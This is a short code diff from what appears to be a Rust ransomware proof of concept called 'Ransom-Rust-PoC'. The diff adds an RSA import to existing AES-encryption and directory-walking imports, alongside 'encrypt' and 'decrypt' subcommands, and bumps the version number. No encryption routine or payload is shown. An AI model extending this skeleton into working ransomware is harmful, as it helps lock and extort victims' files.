@@ -1,6 +1,7 @@
 use aesstream::{AesReader, AesWriter};
 use clap::{App, SubCommand};
 use crypto::aessafe::{AesSafe256Decryptor, AesSafe256Encryptor};
+use openssl::rsa::{Padding, Rsa};
 use rand::{thread_rng, Rng};
 use std::fs::{read, write, File, OpenOptions};
 use std::io::{Read, Write};
@@ -10,7 +11,7 @@ use walkdir::WalkDir;
 fn main() {
     // Argumentos
     let matches = App::new("Ransom-Rust-PoC")
-        .version("0.1")
+        .version("0.3")
         .author("Ricardo M. Prieto (rchip)")
         .subcommand(SubCommand::with_name("cifrar"))
         .subcommand(SubCommand::with_name("descifrar"))
